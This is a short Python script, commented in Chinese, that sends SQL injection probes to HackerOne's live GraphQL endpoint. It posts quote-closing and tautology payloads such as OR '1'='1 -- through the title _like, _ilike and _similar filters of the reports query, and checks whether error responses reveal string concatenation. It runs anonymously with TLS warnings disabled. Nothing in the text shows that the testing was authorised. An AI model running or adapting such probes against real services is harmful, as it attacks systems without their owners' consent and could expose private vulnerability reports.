# -*- coding: utf-8 -*-
"""h1x49: reports where 谓词 SQL 注入探测(匿名;只读 payload,零破坏)
对照基线:like %a% -> 公开报告数;注入 payload -> 报错=拼接"""
import sys, io, json
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
import requests, urllib3
urllib3.disable_warnings()
s = requests.Session()
s.headers.update({'User-Agent': 'Mozilla/5.0'})

def qr(name, where_expr, field='total_count'):
    q = '{ reports(where: %s) { %s } }' % (where_expr, field)
    try:
        r = s.post('https://hackerone.com/graphql', json={'query': q}, timeout=20)
        print(f'--- {name} ---')
        print(f'  [{r.status_code}] {r.text[:300]}')
    except Exception as e:
        print(f'--- {name} ERR {e} ---')

# 基线
qr('base_like_a', '{title: {_like: "%a%"}}')
# 引号闭合尝试
qr('q_quote', '{title: {_like: "%\\'%"}}')
qr('q_or', '{title: {_like: "%\\' OR \\'1\\'=\\'1 --"}}')
qr('q_and', '{title: {_like: "%\\' AND 1=1 --"}}')
# ilike
qr('q_ilike_or', '{title: {_ilike: "%\\' OR \\'1\\'=\\'1 --"}}')
# similar to
qr('q_similar', '{title: {_similar: "%(a|b)%"}}')
qr('q_similar_or', '{title: {_similar: "%\\' OR \\'1\\'=\\'1 --"}}')
# id_like
qr('q_idlike', '{id_like: 5}')
# 数字运算符(Int 注入尝试:gt 传字符串会类型错——用 in 数组?)
qr('q_int_in', '{id: {_in: [1, 2]}}')
qr('q_int_eq_str', '{id: {_eq: 3732660}}')
# _or 嵌套
qr('q_or_nest', '{_or: [{title: {_like: "%a%"}}, {title: {_like: "%b%"}}]}')
